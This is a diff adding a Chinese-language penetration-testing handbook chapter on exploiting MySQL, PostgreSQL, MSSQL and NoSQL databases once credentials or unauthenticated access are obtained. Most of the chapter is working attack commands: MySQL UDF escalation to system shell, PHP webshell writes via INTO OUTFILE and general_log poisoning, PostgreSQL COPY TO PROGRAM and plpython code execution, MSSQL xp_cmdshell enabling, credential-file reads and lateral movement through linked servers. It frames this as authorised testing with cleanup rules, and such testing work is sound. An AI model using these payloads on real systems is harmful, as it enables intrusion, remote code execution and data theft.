@@ -1,0 +1,124 @@
+# 数据库安全专项（MySQL/PostgreSQL/NoSQL 深化）
+
+> 深化 `未授权服务利用.md` 的数据库面：拿到 DB 凭据/未授权连接后的深入利用（提权/RCE/横向）。全部授权测试手法，**读写最小化，验证即恢复**。
+
+## 一、侦察与识别
+
+```
+# 端口: 3306(MySQL) 5432(PG) 1433(MSSQL) 1521(Oracle) 27017(Mongo) 6379(Redis)
+# 版本探测 → 关联已知 CVE（2026 新版本 CVE 持续跟进）
+# 云数据库: RDS/Aurora/云RDS —— 无外网时打同 VPC SSRF/内网面
+nmap -sV -p3306,5432,1433,1521,27017,6379 <t>
+```
+
+## 二、MySQL / MariaDB
+
+### 1. 认证绕过与弱口令
+- 弱口令清单（默认 root/空、root/root、test/test）——**不爆破**（锁库风险）
+- `mysql -h <t> -u root` 空密码面
+
+### 2. 权限提升
+```sql
+SHOW GRANTS;                          -- 看权限
+SELECT user, host, authentication_string FROM mysql.user;  -- 用户哈希
+-- 有 FILE 权限 → 读写文件
+SELECT LOAD_FILE('/etc/passwd');
+-- 有 SUPER → UDF/写文件链
+```
+
+### 3. UDF 提权（到系统 shell）
+```sql
+-- 1. 确认 plugin_dir
+SHOW VARIABLES LIKE 'plugin_dir';
+-- 2. 把恶意 .so（sys_exec 类 UDF）写入 plugin_dir
+SELECT ... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';
+-- 3. 创建函数
+CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
+-- 4. 执行系统命令
+SELECT sys_exec('id');
+```
+**纪律**：UDF 提权会向系统写入文件——影子环境先验证，目标上证明能力后清理插件与函数。
+
+### 4. 写文件与日志投毒
+```sql
+-- 写 webshell（需要 FILE + 可写 web 目录）
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+-- 日志投毒（无 FILE 时）：改 general_log 指向 web 目录，SQL 注入写马
+SET GLOBAL general_log = 'ON';
+SET GLOBAL general_log_file = '/var/www/html/shell.php';
+SELECT '<?php system($_GET["c"]); ?>';
+-- 复现 → 访问 shell.php
+```
+**注意**：`INTO OUTFILE` 拒绝覆盖已存在文件（用 DUMPFILE）；web 目录可写是前提。
+
+### 5. 2026 面
+- 新 CVE 持续跟进（MySQL 8.x 认证/协议层）
+- 云 RDS：无 FILE 权限时走存储过程/插件面有限 → 评估权限边界写报告
+
+## 三、PostgreSQL
+
+### 1. COPY RCE（superuser，杀招）
+```sql
+-- COPY TO PROGRAM（>= 9.3，superuser）
+COPY (SELECT '') TO PROGRAM 'bash -c "id > /tmp/out"';
+-- 写 webshell
+COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
+-- 读文件
+COPY (SELECT pg_read_file('/etc/passwd',0,10000)) TO '/tmp/out.txt';
+```
+
+### 2. 其他链
+```sql
+-- 大对象利用（读文件替代）
+SELECT lo_import('/etc/passwd');  -- 导入为大对象再读
+-- PL/Python 或 PL/Perl（有权限创建函数时）
+CREATE FUNCTION py() RETURNS void AS $$ import os; os.system('id') $$ LANGUAGE plpython3u;
+-- 用户自定义函数 UDF（C 语言，类似 MySQL）
+```
+
+### 3. 面
+- `pg_hba.conf` 信任认证（trust）面：无密码直接连
+- `COPY FROM PROGRAM` 面在 9.3+；旧版用 `COPY ... FROM '/etc/passwd'`
+
+## 四、MSSQL（Windows 生态）
+
+```sql
+-- xp_cmdshell（默认关，开启）
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+-- OLE 自动化替代（xp_cmdshell 被禁时）
+EXEC sp_OACreate 'wscript.shell', @out OUTPUT;
+-- 链接服务器横向
+EXEC sp_linkedservers;  -- 枚举 → 借链跳
+```
+- 弱口令 + `sa` 面是经典；先枚举服务再打
+- 备份到可写目录 → 恶意备份文件替换（restore 覆盖）
+
+## 五、NoSQL / 其他
+
+| 库 | 面 |
+|----|----|
+| Redis | 见 `未授权服务利用.md`（写 crontab/SSH key/主从 RCE） |
+| MongoDB | 未授权 → 数据；老版本 JS 注入（CVE-2013-1892 类） |
+| Elasticsearch | 未授权 → 数据；script 沙箱逃逸（老版本） |
+| Cassandra | 未授权面（默认无认证配置错误） |
+| 向量/图/时序库 | 2026 新面：embedding 泄露/图查询注入（见 ai-llm 手册） |
+
+## 六、数据库横向移动
+
+- 同密码复用：`mysql`/`psql` 凭据在内网多台复用（搜集密码本）
+- 链接服务器/DBLINK：MSSQL linked server、Oracle DBLINK → 跳库
+- 云数据库：DB 内找到云凭证（连接串含 AK）→ 认钥闸 → 云面（见云原生手册）
+
+## 七、持久化（防守理解，不实操）
+- MySQL：触发器/事件调度器/存储过程后门、UDF 常驻
+- PG：触发器/定时任务/扩展模块
+- 了解即可：用于检测规则开发（`威胁狩猎与检测工程.md`），不做部署
+
+## 八、红线
+1. **读数据最小化**：证明存在敏感数据（表名+条数+样例脱敏），不整库拖
+2. **写操作可回滚**：UDF/webshell 类影子环境先验证；目标上证明后**立即清理**（删插件/删文件/关日志）
+3. 不爆破数据库（锁库风险）；弱口令面用少量组合
+4. 不修改业务数据（DELETE/UPDATE 一律不做）
+5. 报告：连接方式→权限→影响（数据量+敏感度），修复建议（强密码/最小权限/网络隔离/审计日志）
